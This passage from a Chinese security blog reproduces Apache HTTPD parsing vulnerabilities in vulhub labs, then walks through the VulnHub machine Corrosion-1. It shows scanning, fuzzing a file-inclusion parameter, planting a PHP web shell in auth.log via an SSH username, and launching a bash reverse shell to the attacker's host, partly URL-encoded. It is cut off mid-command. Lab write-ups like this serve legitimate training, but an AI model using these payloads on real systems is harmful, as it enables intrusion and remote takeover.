</span>43.140.192.244:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">If-Modified-Since</span><span class="hljs-punctuation">: </span>Mon, 11 Jun 2007 18:53:14 GMT<br><span class="hljs-attribute">If-None-Match</span><span class="hljs-punctuation">: </span>&quot;2d-432a5e4a73a80&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>7<br><br><span class="language-bash"><span class="hljs-built_in">echo</span>;<span class="hljs-built_in">id</span></span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501131048647.png" alt="image-20230501131048647"></p><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="HTTPD换行解析漏洞"><a href="#HTTPD换行解析漏洞" class="headerlink" title="HTTPD换行解析漏洞"></a>HTTPD换行解析漏洞</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache HTTPD是一款HTTP服务器，它可以通过 mod_php 来运行PHP网页。</p><p>其 2.4.0~2.4.29 版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code> 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd vulhub-master/httpd/CVE-2017-15715<br>docker-compose up -d<br></code></pre></td></tr></table></figure><blockquote><p>在文件名后加 “%0a” 再进行 URL 编码</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501111019751.png" alt="image-20230501111019751"></p><blockquote><p>访问 &#x2F;evil.php%0a</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501111418190.png" alt="image-20230501111418190"></p><h3 id="HTTPD多后缀解析漏洞"><a href="#HTTPD多后缀解析漏洞" class="headerlink" title="HTTPD多后缀解析漏洞"></a>HTTPD多后缀解析漏洞</h3><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType text/html <span class="hljs-string">.html</span><br>AddLanguage zh-CN <span class="hljs-string">.cn</span><br></code></pre></td></tr></table></figure><p>其给 <code>.html</code> 后缀增加了media-type，值为<code>text/html</code>；给 <code>.cn</code> 后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件 <code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是 Apache 多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddHandler <span class="hljs-built_in">application</span>/x-httpd-php .php<br></code></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd vulhub-master/httpd/apache_parsing_vulnerability<br>docker-compose up -d<br></code></pre></td></tr></table></figure><blockquote><p>访问 <a href="http://your-ip/uploadfiles/apache.php.jpeg">http://your-ip/uploadfiles/apache.php.jpeg</a></p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501113211507.png" alt="image-20230501113211507"></p><h3 id="未知扩展名解析"><a href="#未知扩展名解析" class="headerlink" title="未知扩展名解析"></a>未知扩展名解析</h3><h4 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。</p><p>该漏洞与Apache 、 php版本误关,属于用户配置不当造成的解析漏洞：</p><ol><li>使用module模式与php结合的所有版本apache存在未知扩展名解析漏洞。</li><li>使用fastcgi模式与php结合的所有版本apache不存在此漏洞。</li><li>利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt&#x2F;html文档处理。</li></ol><h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><blockquote><p>使用 KALI 上面的 apache 修改配置文件即可</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启动 apache 服务</span><br>systemctl start apache2 <br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改配置文件</span><br>cd /etc/apache2/mods-enabled<br>vim php8.2.conf <br><span class="hljs-meta prompt_"># </span><span class="language-bash">重启服务</span><br>systemctl restart apache2<br><span class="hljs-meta prompt_"># </span><span class="language-bash">测试文件</span><br>cd /var/www/html/<br>echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; test.php.fuming<br></code></pre></td></tr></table></figure><p>配置文件修改如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;<span class="hljs-attr">.</span>+\<span class="hljs-attr">.ph</span>(<span class="hljs-attr">ar</span>|<span class="hljs-attr">p</span>|<span class="hljs-attr">tml</span>)&quot;&gt;</span><br>    SetHandler application/x-httpd-php<br><span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>访问 test.php.fuming 会被解析</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501120312020.png" alt="image-20230501120312020"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Corrosion-1</title>
    <link href="/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/corrosion-1/"/>
    <url>/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/corrosion-1/</url>
    
    <content type="html"><![CDATA[<h1 id="Corrosion-1"><a href="#Corrosion-1" class="headerlink" title="Corrosion-1"></a>Corrosion-1</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/corrosion-1,730/">https://www.vulnhub.com/entry/corrosion-1,730/</a></p><p>难度：容易</p><p>提示：Enumerate Property  枚举</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>KALI 中可以使用 <code>arp-scan</code> 和 <code>netdiscover</code> 这两个基于 ARP 的扫描工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp-scan -l<br>netdiscover -r 192.168.222.0/24 <br></code></pre></td></tr></table></figure><p>这里使用 arp-scan 进行主机发现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# arp-scan -l             <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:99:90:c7, IPv4: 192.168.222.128<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.222.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.222.2   00:50:56:ec:db:c2       VMware, Inc.<br>192.168.222.144 00:0c:29:52:52:45       VMware, Inc.<br>192.168.222.254 00:50:56:f7:0d:b2       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.10.0: 256 hosts scanned in 2.362 seconds (108.38 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# nmap -p- -A 192.168.222.144     <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 04:31 EDT<br>Nmap scan report for localhost (192.168.222.144)<br>Host is up (0.00092s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 0ca71c8b4e856b168cfdb7cd5f603ea4 (RSA)<br>|   256 0f24f465af50d3d3aa0933c3173d63c7 (ECDSA)<br>|_  256 b0facd7773dae47dc875a1c55f2c210a (ED25519)<br>80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.46 (Ubuntu)<br>MAC Address: 00:0C:29:52:52:45 (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.92 ms localhost (192.168.222.144)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds<br></code></pre></td></tr></table></figure><p>SSH 和 80 的 web：</p><ul><li>SSH 爆破无果</li><li>web 为默认的 apache 页面，前端无隐藏信息，需要进行目录扫描</li></ul><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>KALI 下的目录扫描工具：dirb，dirsearch，dirbuster，gobuster </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirb url<br>dirsearch -u url<br>gobuster dir -u url -w dic.txt -x php,html,txt<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/usr/share/wordlists/dirbuster]<br>└─# gobuster dir -u http://192.168.222.144/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.222.144/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/04/29 04:44:38 Starting gobuster in directory enumeration mode<br>===============================================================<br>/tasks                (Status: 301) [Size: 318] [--&gt; http://192.168.222.144/tasks/]<br>/blog-post            (Status: 301) [Size: 322] [--&gt; http://192.168.222.144/blog-post/]<br>/server-status        (Status: 403) [Size: 280]<br>Progress: 220220 / 220561 (99.85%)<br>===============================================================<br>2023/04/29 04:45:54 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p><a href="http://192.168.222.144/tasks/">http://192.168.222.144/tasks/</a></p><p><a href="http://192.168.222.144/tasks/tasks_todo.txt">http://192.168.222.144/tasks/tasks_todo.txt</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429164751579.png" alt="image-20230429164751579"></p><p><a href="http://192.168.222.144/blog-post/">http://192.168.222.144/blog-post/</a>  图片无隐写，前端无信息</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429164837779.png" alt="image-20230429164837779"></p><p>再次进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/usr/share/wordlists/dirbuster]<br>└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.222.144/tasks/ <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.222.144/tasks/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/04/29 04:57:49 Starting gobuster in directory enumeration mode<br>===============================================================<br>Progress: 220200 / 220561 (99.84%)<br>===============================================================<br>2023/04/29 05:00:10 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.222.144/blog-post/ <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.222.144/blog-post/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/04/29 04:58:05 Starting gobuster in directory enumeration mode<br>===============================================================<br>/archives             (Status: 301) [Size: 331] [--&gt; http://192.168.222.144/blog-post/archives/]<br>/uploads              (Status: 301) [Size: 330] [--&gt; http://192.168.222.144/blog-post/uploads/]<br>Progress: 220270 / 220561 (99.87%)<br>===============================================================<br>2023/04/29 05:00:25 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p><a href="http://192.168.222.144/blog-post/archives/">http://192.168.222.144/blog-post/archives/</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429170208027.png" alt="image-20230429170208027"></p><p><a href="http://192.168.222.144/blog-post/archives/randylogs.php">http://192.168.222.144/blog-post/archives/randylogs.php</a> 空白</p><p><a href="http://192.168.222.144/blog-post/uploads/">http://192.168.222.144/blog-post/uploads/</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429170332475.png" alt="image-20230429170332475"></p><h3 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h3><p>到这里信息收集完了，存在信息如下：</p><p><a href="http://192.168.222.144/tasks/tasks_todo.txt">http://192.168.222.144/tasks/tasks_todo.txt</a></p><p><a href="http://192.168.222.144/blog-post/archives/randylogs.php">http://192.168.222.144/blog-post/archives/randylogs.php</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429164751579.png" alt="image-20230429164751579"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429170907168.png" alt="image-20230429170907168"></p><p>看不懂 ~</p><p>这里就卡住了，网上查一下是通过文件包含日志拿 shell。</p><p>知道后再来推一下：就是通过 tasks_todo.txt 中的 auth log 和 randylogs.php 这里推出是要通过 auth log （ 都有 log ）作为漏洞点，搜索一下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429171150889.png" alt="image-20230429171150889"></p><p>直接可以拿 shell 了。</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="文件包含authlog拿shell"><a href="#文件包含authlog拿shell" class="headerlink" title="文件包含authlog拿shell"></a>文件包含authlog拿shell</h3><p>先看一下这个漏洞：</p><p>auth log 是 &#x2F;var&#x2F;log&#x2F;auth.log ，它是 SSH 的登录日志，会记录一些 SSH 信息，比如登录的用户名。</p><p>拿 Shell：通过 SSH 登录的用户名将Shell写到auth.log中，然后利用文件包含去执行Shell。</p><h3 id="Fuzz文件包含参数"><a href="#Fuzz文件包含参数" class="headerlink" title="Fuzz文件包含参数"></a>Fuzz文件包含参数</h3><p><a href="http://192.168.222.144/blog-post/archives/randylogs.php">http://192.168.222.144/blog-post/archives/randylogs.php</a> 这里是存在文件包含，但是没有参数，所以需要去 Fuzz 下参数。</p><p>KALI 下的 Fuzz 工具：ffuf，wfuzz</p><p>这两个工具都差不多，在需要Fuzz的地方使用 <code>FUZZ</code> 字符串代替即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 0 -u http://192.168.222.144/blog-post/archives/randylogs.php?FUZZ=/var/log/auth.log<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.<br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://192.168.222.144/blog-post/archives/randylogs.php?FUZZ=/var/log/auth.log<br>Total requests: 220560<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload                                                                                        <br>=====================================================================<br><br>000000759:   200        4535 L   60052 W    484303 Ch   &quot;file&quot;                                                                                         <br><br></code></pre></td></tr></table></figure><p>命令参数：</p><ul><li>-c：彩色</li><li>-w：字典</li><li>–hw：隐藏单词数为多少的记录</li><li>-u：url</li></ul><p>这里得到的参数是 file</p><p><a href="http://192.168.222.144/blog-post/archives/randylogs.php?file=/var/log/auth.log">http://192.168.222.144/blog-post/archives/randylogs.php?file=/var/log/auth.log</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429173454488.png" alt="image-20230429173454488"></p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>先phpinfo看下能否文件包含。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# ssh &#x27;&lt;?php phpinfo();?&gt;&#x27;@192.168.222.144<br>&lt;?php phpinfo();?&gt;@192.168.222.144&#x27;s password: <br>Permission denied, please try again.<br>&lt;?php phpinfo();?&gt;@192.168.222.144&#x27;s password: <br>Permission denied, please try again.<br>&lt;?php phpinfo();?&gt;@192.168.222.144&#x27;s password: <br>&lt;?php phpinfo();?&gt;@192.168.222.144: Permission denied (publickey,password).<br></code></pre></td></tr></table></figure><p><a href="http://192.168.222.144/blog-post/archives/randylogs.php?file=/var/log/auth.log">http://192.168.222.144/blog-post/archives/randylogs.php?file=/var/log/auth.log</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429173728420.png" alt="image-20230429173728420"></p><p>可以包含，那么就反弹 Shell：</p><blockquote><p>写Shell</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh &#x27;&lt;?php system($_GET[cmd]);?&gt;&#x27;@192.168.222.144<br></code></pre></td></tr></table></figure><blockquote><p>测试能否执行命令</p></blockquote><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=/var/<span class="hljs-keyword">log</span>/auth.<span class="hljs-keyword">log</span>&amp;cmd=echo%20%22fuyoumingyan%22<br></code></pre></td></tr></table></figure><blockquote><p>可以正常执行命令</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429174610131.png" alt="image-20230429174610131"></p><blockquote><p>kali nc 监听</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><blockquote><p>构造反弹Shell</p></blockquote><p>通过 <a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a> 生成一下 bash 的反弹Shell：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.222.128</span>/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>使用 bash -c 执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.222.128</span>/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>URL编码（ 这种通过URL传递就需要进行URL编码，使用BurpSuite的编码功能对其编码可以正常执行，比较方便 ）</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429174931969.png" alt="image-20230429174931969"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">62</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">68</span><span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>d<span class="hljs-meta">%</span><span class="hljs-number">63</span><span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span><span class="hljs-number">62</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">68</span><span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>d<span class="hljs-meta">%</span><span class="hljs-number">69</span><span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>e<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>f<span class="hljs-meta">%</span><span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">65</span><span class="hljs-meta">%</span><span class="hljs-number">76</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>f<span class="hljs-meta">%</span><span class="hljs-number">74</span><span class="hljs-meta">%</span><span class="hljs-number">63</span><span class="hljs-meta">%</span><span class="hljs-number">70</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>f<span class="hljs-meta">%</span><span class="hljs-number">31</span><span class="hljs-meta">%</span><span class="hljs-number">39</span><span class="hljs-meta">%</span><span class="hljs-number">32</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>e<span class="hljs-meta">%</span><span class="hljs-number">31</span><span class="hljs-meta">%</span><span class="hljs-number">36</span><span class="hljs-meta">%</span><span class="hljs-number">38</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>e<span class="hljs-meta">%</span><span class="hljs-number">32</span><span class="hljs-meta">%</span><span class="hljs-number">32</span><span class="hljs-meta">%</span><span class="hljs-number">32</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>e<span class="hljs-meta">%</span><span class="hljs-number">31</span><span class="hljs-meta">%</span><span class="hljs-number">32</span><span class="hljs-meta">%</span><span class="hljs-number">38</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>f<span class="hljs-meta">%</span><span class="hljs-number">39</span><span class="hljs-meta">%</span><span class="hljs-number">39</span><span class="hljs-meta">%</span><span class="hljs-number">39</span><span class="hljs-meta">%</span><span class="hljs-number">39</span><span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">30</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>e<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">31</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p>执行代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.222.144</span>/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;cmd=%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span 